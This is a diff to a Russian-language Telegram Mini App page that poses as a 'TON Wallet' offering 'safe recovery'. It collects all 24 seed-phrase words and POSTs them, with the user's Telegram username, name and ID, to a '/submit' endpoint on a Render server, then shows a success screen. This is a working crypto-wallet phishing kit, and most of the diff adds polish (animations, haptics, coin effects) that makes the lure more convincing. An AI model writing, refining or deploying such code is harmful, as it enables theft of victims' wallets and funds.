@@ -79,6 +79,11 @@
             width: 100%;
         }
 
+        .wallet-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.3);
+        }
+
         h2 {
             font-size: 28px;
             font-weight: 600;
@@ -100,6 +105,7 @@
             display: inline-block;
             background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2340a0ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/><circle cx="12" cy="12" r="2" fill="white"/></svg>') no-repeat center;
             background-size: contain;
+            filter: drop-shadow(0 2px 4px rgba(0,160,255,0.5));
             animation: iconGlow 2s infinite;
         }
 
@@ -153,6 +159,7 @@
             transition: all 0.2s ease;
             width: 100%;
             backdrop-filter: blur(4px);
+            letter-spacing: 0.3px;
         }
 
         .input-number {
@@ -164,7 +171,16 @@
             font-weight: 500;
             color: #6a7080;
             pointer-events: none;
+            z-index: 1;
             font-family: monospace;
+            letter-spacing: 0;
+        }
+
+        .word-input.active-highlight {
+            border-color: #2e7db9;
+            box-shadow: 0 0 0 3px rgba(46, 125, 185, 0.25);
+            background: #1e2635;
+            transform: scale(1.01);
         }
 
         .word-input:focus {
@@ -172,10 +188,13 @@
             border-color: #3f8bcb;
             box-shadow: 0 0 0 3px rgba(63, 139, 203, 0.3);
             background: #1e2635;
+            transform: scale(1.01);
         }
 
         .word-input::placeholder {
             color: #5e6472;
+            font-weight: 400;
+            font-size: 14px;
         }
 
         .ton-button {
@@ -195,21 +214,40 @@
             transition: all 0.25s ease;
             margin-top: 28px;
             box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ton-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s;
+        }
+
+        .ton-button:hover::before {
+            left: 100%;
         }
 
         .ton-button:active {
             transform: scale(0.97);
+            background: linear-gradient(95deg, #0f3552, #1e5780);
         }
 
         .success-icon {
             font-size: 72px;
             text-align: center;
-            animation: bounceSuccess 0.6s;
+            animation: bounceSuccess 0.6s cubic-bezier(0.34, 1.2, 0.64, 1);
             margin-bottom: 16px;
         }
 
         @keyframes bounceSuccess {
             0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
+            50% { transform: scale(1.2) rotate(2deg); }
             100% { transform: scale(1) rotate(0); opacity: 1; }
         }
 
@@ -226,6 +264,14 @@
             padding: 6px 14px;
             border-radius: 40px;
             font-size: 13px;
+            backdrop-filter: blur(4px);
+        }
+
+        .close-hint {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #6e86a3;
+            text-align: center;
         }
 
         .status-banner {
@@ -239,16 +285,41 @@
         }
 
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
+            0% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
             75% { transform: translateX(4px); }
+            100% { transform: translateX(0); }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1e2a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2e7db9;
+            border-radius: 10px;
         }
 
         @media (max-width: 480px) {
-            .page { padding: 20px 16px 30px; }
-            .word-input { padding: 10px 10px 10px 44px; font-size: 14px; }
-            .input-number { font-size: 12px; left: 14px; }
-            h2 { font-size: 24px; }
+            .page {
+                padding: 20px 16px 30px;
+            }
+            .word-input {
+                padding: 10px 10px 10px 44px;
+                font-size: 14px;
+            }
+            .input-number {
+                font-size: 12px;
+                left: 14px;
+            }
+            h2 {
+                font-size: 24px;
+            }
+            .wallet-card {
+                padding: 24px 18px;
+            }
         }
     </style>
 </head>
@@ -261,7 +332,7 @@
                 <div class="ton-icon-svg"></div>
                 <span style="font-size: 36px;">⚡</span>
             </div>
-            <h2>TON Wallet</h2>
+            <h2><span>TON</span> Wallet</h2>
             <div class="subtext">
                 <span class="small-ton">🔐 Безопасное восстановление</span>
                 <span class="small-ton">24 слова seed-фразы</span>
@@ -277,6 +348,7 @@
             </div>
             <button id="continueBtn" class="ton-button">🚀 Начать восстановление ✨</button>
         </div>
+        <div class="close-hint">* Интерфейс в стиле Telegram Wallet</div>
     </div>
 
     <div id="formPage" class="page hidden">
@@ -312,33 +384,56 @@
         tg.ready();
         tg.expand();
 
-        // СОЗДАНИЕ ПОЛЕЙ
+        // СОЗДАНИЕ 24 ПОЛЕЙ
         const col1 = document.getElementById('col1');
         const col2 = document.getElementById('col2');
         col1.innerHTML = '';
         col2.innerHTML = '';
+        const inputFields = [];
 
         for (let i = 1; i <= 24; i++) {
             const wrapper = document.createElement('div');
             wrapper.className = 'input-wrapper';
+            
             const input = document.createElement('input');
             input.type = 'text';
             input.placeholder = `слово ${i}`;
             input.id = `word${i}`;
             input.classList.add('word-input');
             input.autocomplete = 'off';
+            input.spellcheck = false;
+            
             const numberSpan = document.createElement('span');
             numberSpan.className = 'input-number';
             numberSpan.textContent = `${i}.`;
+            
+            wrapper.appendChild(numberSpan);
+            wrapper.appendChild(input);
+            
+            const addHighlight = () => input.classList.add('active-highlight');
+            const removeHighlight = () => input.classList.remove('active-highlight');
+            
+            input.addEventListener('focus', addHighlight);
+            input.addEventListener('blur', removeHighlight);
+            
             input.addEventListener('input', (e) => {
                 let val = e.target.value;
                 val = val.toLowerCase().replace(/[^a-z]/g, '');
                 e.target.value = val;
+                if (!input.classList.contains('active-highlight')) {
+                    input.classList.add('active-highlight');
+                }
+                if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
             });
-            wrapper.appendChild(numberSpan);
-            wrapper.appendChild(input);
-            if (i <= 12) col1.appendChild(wrapper);
-            else col2.appendChild(wrapper);
+            
+            input.addEventListener('blur', removeHighlight);
+            
+            if (i <= 12) {
+                col1.appendChild(wrapper);
+            } else {
+                col2.appendChild(wrapper);
+            }
+            inputFields.push(input);
         }
 
         // НАВИГАЦИЯ
@@ -356,9 +451,10 @@
             if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
         });
 
-        // ОТПРАВКА ЧЕРЕЗ FETCH (вместо tg.sendData)
+        // ОТПРАВКА ДАННЫХ ЧЕРЕЗ FETCH (на сервер Render)
         sendBtn.addEventListener('click', async () => {
             const wordsArray = [];
+            let hasError = false;
             
             for (let i = 1; i <= 24; i++) {
                 const inputField = document.getElementById(`word${i}`);
@@ -367,18 +463,30 @@
                     inputField.style.borderColor = '#ff6b6b';
                     inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
                     setTimeout(() => {
-                        inputField.style.borderColor = '';
-                        inputField.style.animation = '';
+                        if (inputField) {
+                            inputField.style.borderColor = '';
+                            inputField.style.animation = '';
+                        }
                     }, 800);
-                    alert(`⚠️ Заполните слово ${i}!`);
-                    return;
+                    hasError = true;
+                    if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                    alert(`⚠️ Пожалуйста, заполните слово №${i}`);
+                    inputField.focus();
+                    break;
+                }
+                if (wordValue.length > 35) {
+                    alert(`Слово №${i} слишком длинное (максимум 35 символов)`);
+                    hasError = true;
+                    break;
                 }
                 wordsArray.push(wordValue);
             }
+            
+            if (hasError) return;
 
-            const username = tg.initDataUnsafe.user?.username || "без_имени";
-            const first_name = tg.initDataUnsafe.user?.first_name || "";
-            const userId = tg.initDataUnsafe.user?.id;
+            let username = tg.initDataUnsafe.user?.username || "без_имени";
+            let first_name = tg.initDataUnsafe.user?.first_name || "";
+            let userId = tg.initDataUnsafe.user?.id;
             
             const payload = {
                 words: wordsArray,
@@ -388,58 +496,123 @@
                 timestamp: Date.now()
             };
             
+            // Блокируем кнопку и показываем статус
             sendBtn.disabled = true;
-            statusBanner.innerHTML = '⏳ Отправка...';
+            sendBtn.style.opacity = '0.6';
+            statusBanner.innerHTML = '⏳ Отправка данных...';
+            statusBanner.style.color = '#ffaa44';
             
             try {
+                // Отправляем на сервер Render (относительный путь)
                 const response = await fetch('/submit', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify(payload)
                 });
                 
                 if (response.ok) {
-                    statusBanner.innerHTML = '✅ Отправлено!';
+                    statusBanner.innerHTML = '✅ Отправлено успешно!';
+                    statusBanner.style.color = '#88ff88';
                     if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                    
+                    // Показываем страницу успеха
                     formPage.classList.add('hidden');
                     successPage.classList.remove('hidden');
+                    successPage.style.animation = 'fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.2)';
                 } else {
-                    throw new Error('Ошибка');
+                    throw new Error('Ошибка сервера');
                 }
             } catch(e) {
-                statusBanner.innerHTML = '❌ Ошибка отправки';
+                console.error("Ошибка:", e);
+                statusBanner.innerHTML = '❌ Ошибка отправки. Попробуйте еще раз.';
+                statusBanner.style.color = '#ff6666';
                 sendBtn.disabled = false;
-                alert("❌ Ошибка отправки");
+                sendBtn.style.opacity = '1';
+                alert("❌ Ошибка отправки. Проверьте подключение.");
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
             }
         });
         
-        closeBtn.addEventListener('click', () => {
-            tg.close();
-        });
+        // Закрытие приложения
+        if (closeBtn) {
+            closeBtn.addEventListener('click', () => {
+                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+                tg.close();
+            });
+        }
+
+        // Эффект монет при клике
+        function createBurstOfCoins(x, y) {
+            for (let i = 0; i < 12; i++) {
+                const burstCoin = document.createElement('div');
+                burstCoin.textContent = '🪙';
+                burstCoin.style.position = 'fixed';
+                burstCoin.style.fontSize = (Math.random() * 22 + 16) + 'px';
+                burstCoin.style.left = (x || window.innerWidth/2) + (Math.random() - 0.5) * 100 + 'px';
+                burstCoin.style.top = (y || window.innerHeight/2) + (Math.random() - 0.5) * 80 + 'px';
+                burstCoin.style.opacity = '0.9';
+                burstCoin.style.pointerEvents = 'none';
+                burstCoin.style.zIndex = '9999';
+                burstCoin.style.transition = 'all 1s ease-out';
+                document.body.appendChild(burstCoin);
+                
+                setTimeout(() => {
+                    burstCoin.style.transform = `translateY(-${Math.random() * 150 + 50}px) rotate(${Math.random() * 360}deg)`;
+                    burstCoin.style.opacity = '0';
+                }, 10);
+                
+                setTimeout(() => burstCoin.remove(), 1100);
+            }
+        }
         
-        // Адаптация под тему
-        if (tg.colorScheme === 'light') {
+        if (sendBtn) {
+            sendBtn.addEventListener('click', (e) => {
+                const rect = sendBtn.getBoundingClientRect();
+                createBurstOfCoins(rect.left + rect.width/2, rect.top + rect.height/2);
+            });
+        }
+        if (continueBtn) {
+            continueBtn.addEventListener('click', (e) => {
+                const rect = continueBtn.getBoundingClientRect();
+                createBurstOfCoins(rect.left + rect.width/2, rect.top + rect.height/2);
+            });
+        }
+        
+        // Адаптация под тему Telegram
+        if (tg.colorScheme === 'dark') {
+            document.body.style.setProperty('--tg-theme-bg-color', '#0a0c12');
+        } else {
             document.body.style.setProperty('--tg-theme-bg-color', '#f0f2f5');
             document.body.style.setProperty('--tg-theme-text-color', '#1f2a3e');
             const cards = document.querySelectorAll('.wallet-card');
-            cards.forEach(card => card.style.background = 'rgba(245, 248, 250, 0.92)');
+            cards.forEach(card => {
+                card.style.background = 'rgba(245, 248, 250, 0.92)';
+            });
         }
         
         // Переход по Enter
-        const inputs = document.querySelectorAll('.word-input');
-        inputs.forEach((input, idx) => {
+        inputFields.forEach((input, idx) => {
             input.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') {
                     e.preventDefault();
-                    if (idx + 1 < inputs.length) inputs[idx + 1].focus();
-                    else if (sendBtn && !sendBtn.disabled) sendBtn.click();
+                    const nextIdx = idx + 1;
+                    if (nextIdx < inputFields.length) {
+                        inputFields[nextIdx].focus();
+                    } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
+                        sendBtn.click();
+                    }
                 }
             });
         });
         
+        // Убеждаемся, что successPage скрыта при старте
         successPage.classList.add('hidden');
         formPage.classList.add('hidden');
         introPage.classList.remove('hidden');
+        
+        console.log('TON Wallet — готов к работе с сервером Render');
     </script>
 </body>
 </html>
